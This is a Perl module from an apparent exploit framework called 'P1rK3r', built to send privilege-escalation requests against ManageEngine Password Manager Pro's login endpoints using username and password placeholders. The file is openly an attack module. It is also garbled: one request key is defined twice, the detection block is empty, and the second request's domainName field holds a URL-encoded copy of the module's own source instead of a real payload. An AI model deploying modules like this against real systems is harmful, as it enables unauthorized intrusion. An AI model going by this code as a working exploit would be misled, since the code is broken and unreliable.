package P1rK3r::Exploits::MANAGEENGINE::MSF::ManageenginePmpPrivesc;
use parent qw(P1rK3r::Exploit P1rK3r::Services::MANAGEENGINE);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

use P1rK3r::Functions::Basic;
use P1rK3r::Functions::Errors;
use P1rK3r::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "ManageenginePmpPrivesc";

   my $DETECTION = {

   };

   my $EXPLOIT = {
        TYPE => 'MSF',
        PLATFORM => 'ALL',
        REQUESTS => {
                EXPLOIT1 => {
                        METHOD       => 'GET',
                        PATH         => '',
                        PAYLOAD      => '',
                        TEXT         => 'Sending Exploit #1 Request : [GET] ',
                        HEADERS      => {
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT1 => {
                        METHOD       => 'POST',
                        PATH         => 'login/AjaxResponse.jsp',
                        PAYLOAD      => '',
                        TEXT         => 'Sending Exploit #1 Request : [POST] /login/AjaxResponse.jsp',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
                EXPLOIT2 => {
                        METHOD       => 'POST',
                        PATH         => 'j_security_check;',
                        PAYLOAD      => 'j_username=__USERNAME__&username=__USERNAME__&j_password=__PASSWORD__&domainName=Exploits/MANAGEENGINE/MSF/ManageenginePmpPrivesc.pm%0apackage%20P1rK3r%3a%3aExploits%3a%3aMANAGEENGINE%3a%3aMSF%3a%3aManageenginePmpPrivesc%3b%0ause%20parent%20qw%28P1rK3r%3a%3aExploit%20P1rK3r%3a%3aServices%3a%3aMANAGEENGINE%29%3b%0a%0ause%205.10.0%3b%0a%0ause%20strict%3b%0ause%20warnings%3b%0a%0ano%20warnings%20%27experimental%27%3b%0a%0ause%20URI%3a%3aURL%3b%0ause%20Data%3a%3aDump%20qw%28dump%29%3b%0ause%20Coro%20qw%28%20async%20%29%3b%0a%0ause%20P1rK3r%3a%3aFunctions%3a%3aBasic%3b%0ause%20P1rK3r%3a%3aFunctions%3a%3aErrors%3b%0ause%20P1rK3r%3a%3aFunctions%3a%3aContent%3b%0a%0asub%20load%20%7b%0a%20%20%20%20my%20%24type%20%20%3d%20shift%3b%0a%20%20%20%20my%20%24class%20%3d%20ref%20%24type%20%7c%7c%20%24type%3b%0a%20%20%20%20my%20%24self%20%3d%20%7b%20%7d%3b%0a%20%20%20%20bless%20%24self%2c%20%24class%3b%0a%0a%20%20%20%20return%20%24self%3b%0a%7d%0a%0asub%20new%20%7b%0a%20%20%20my%20%24class%20%3d%20shift%3b%0a%20%20%20my%20%28%20%24requester%2c%20%24database%20%29%20%3d%20%40_%3b%0a%0a%20%20%20my%20%24name%20%3d%20%22ManageenginePmpPrivesc%22%3b%0a%0a%20%20%20my%20%24DETECTION%20%3d%20%7b%0a%20%20%20%20%20%20%20%20METHOD%20%3d%3e%20%27POST%27%2c%0a%20%20%20%20%20%20%20%20PATH%20%3d%3e%20%27/login/AjaxResponse.jsp%27%2c%0a%20%20%20%20%20%20%20%20PAYLOAD%20%3d%3e%20%27%27%2c%0a%20%20%20%20%20%20%20%20TEXT%20%3d%3e%20%27Checking%20If%20%3a%20/login/AjaxResponse.jsp%20Exists%20...%27%2c%0a%20%20%20%20%20%20%20%20VALIDATION%20%20%20%3d%3e%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20TCODE%20%3d%3e%20%5b%27200%27%5d%2c%0a%20%20%20%20%20%20%20%20%7d%2c%0a%20%20%20%7d%3b%0a%0a%20%20%20my%20%24EXPLOIT%20%3d%20%7b%0a%20%20%20%20%20%20%20%20TYPE%20%3d%3e%20%27MSF%27%2c%0a%20%20%20%20%20%20%20%20PLATFORM%20%3d%3e%20%27ALL%27%2c%0a%20%20%20%20%20%20%20%20REQUESTS%20%3d%3e%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20EXPLOIT1%20%3d%3e%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20METHOD%20%20%20%20%20%20%20%3d%3e%20%27POST%27%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20PATH%20%20%20%20%20%20%20%20%20%3d%3e%20%27login/AjaxResponse.jsp%27%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20PAYLOAD%20%20%20%20%20%20%3d%3e%20%27%27%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20TEXT%20%20%20%20%20%20%20%20%20%3d%3e%20%27Sending%20Exploit%20%231%20Request%20%3a%20%5bPOST%5d%20/login/AjaxResponse.jsp%27%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20HEADERS%20%20%20%20%20%20%3d%3e%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%27Cookie%27%20%3d%3e%20%27%27%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%27Content-Type%27%20%3d%3e%20%27application/x-www-form-urlencoded%27%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20VALIDATION%20%20%20%3d%3e%20%7b%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20TCODE%20%3d%3e%20%5b%27200%27%5d%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%2c%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7d%2c%0a%20%20%20%20%20%20%20%20%7d%2c%0a%20%20%20%7d%3b%0a%0a%20%20%20return%20%24class-%3eSUPER%3a%3anew%28%24requester%2c%20%24database%2c%20%24name%2c%20%24DETECTION%2c%20%24EXPLOIT%2c%20%40_%29%3b%0a%7d%0a%0areturn%201%3b',
                        TEXT         => 'Sending Exploit #2 Request : [POST] /j_security_check;',
                        HEADERS      => {
                           'Cookie' => '',
                           'Content-Type' => 'application/x-www-form-urlencoded',
                        },
                        VALIDATION   => {
                           TCODE => ['200'],
                        },
                },
        },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
